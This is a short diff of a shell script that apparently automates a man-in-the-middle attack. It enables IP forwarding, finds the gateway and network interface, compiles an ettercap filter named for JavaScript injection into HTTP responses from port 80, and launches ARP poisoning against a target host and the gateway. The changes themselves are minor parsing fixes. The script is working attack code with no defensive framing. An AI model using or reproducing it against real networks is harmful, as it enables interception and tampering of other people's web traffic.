@@ -25,7 +25,7 @@ do
 done
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
-ROUTE=$(route -n | grep Gate -A 1 | grep 0.0 | cut -d "." -f 4-7)
+ROUTE=$(route -n | grep Gate -A 1 | grep 0.0 | cut -d "." -f 4-7 | tr -d ' ')
 ROUTE=${ROUTE:1:-1}
 LAN=$(echo $ROUTE | cut -d '.' -f 1-3)'.'
 NIC=$(ifconfig | grep $LAN -B 1 | cut -d ' ' -f 1 | head -n 1)
@@ -60,5 +60,4 @@ if (ip.proto == TCP && tcp.src == 80) {
 }' > etter.filter.jsinject
 
 etterfilter -w etter.filter.jsinject -o jsinject.ef
-
 ettercap -i $NIC -TqF jsinject.ef -M ARP /$TARG/ /$ROUTE/
